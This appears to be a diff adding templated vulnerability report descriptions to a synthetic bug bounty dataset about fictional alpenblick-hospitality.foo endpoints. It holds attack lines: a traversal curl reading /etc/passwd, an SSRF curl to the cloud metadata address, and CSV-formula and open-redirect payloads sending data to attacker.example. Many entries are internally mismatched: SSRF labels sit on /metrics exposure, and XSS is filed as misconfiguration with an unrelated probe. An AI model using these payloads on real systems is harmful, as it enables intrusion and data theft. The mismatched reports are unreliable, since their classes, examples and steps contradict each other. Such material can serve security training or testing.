+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4997,7 +5033,8 @@
           "offset": "6d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.alpenblick-hospitality.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5135,7 +5172,8 @@
           "offset": "2d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5231,7 +5269,8 @@
           "offset": "5d 5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5395,7 +5434,8 @@
           "offset": "8d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5513,7 +5553,8 @@
           "offset": "4d 16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenblick-hospitality.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5653,7 +5694,8 @@
           "offset": "5d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenblick-hospitality.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5773,7 +5815,8 @@
           "offset": "3d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5897,7 +5940,8 @@
           "offset": "6d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenblick-hospitality.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6061,7 +6105,8 @@
           "offset": "6d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6224,7 +6269,8 @@
           "offset": "7d 17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.alpenblick-hospitality.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6356,7 +6402,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenblick-hospitality.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6455,7 +6502,8 @@
           "offset": "2d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.alpenblick-hospitality.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6558,7 +6606,8 @@
           "offset": "6d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenblick-hospitality.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6660,7 +6709,8 @@
           "offset": "23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6803,7 +6853,8 @@
           "offset": "7d",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenblick-hospitality.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6925,7 +6976,8 @@
           "offset": "1d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7077,7 +7129,8 @@
           "offset": "10d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.alpenblick-hospitality.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7202,7 +7255,8 @@
           "offset": "2d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7330,7 +7384,8 @@
           "offset": "1d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.alpenblick-hospitality.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7473,7 +7528,8 @@
           "offset": "6d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenblick-hospitality.foo/export`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7585,7 +7641,8 @@
           "offset": "2d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.alpenblick-hospitality.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7753,7 +7810,8 @@
           "offset": "6d 7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenblick-hospitality.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7869,7 +7927,8 @@
           "offset": "1d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenblick-hospitality.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8012,7 +8071,8 @@
           "offset": "6d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8143,7 +8203,8 @@
           "offset": "3d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.alpenblick-hospitality.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8273,7 +8334,8 @@
           "offset": "1d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8368,7 +8430,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8507,7 +8570,8 @@
           "offset": "4d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8617,7 +8681,8 @@
           "offset": "7d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenblick-hospitality.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8741,7 +8806,8 @@
           "offset": "3d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8881,7 +8947,8 @@
           "offset": "4d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
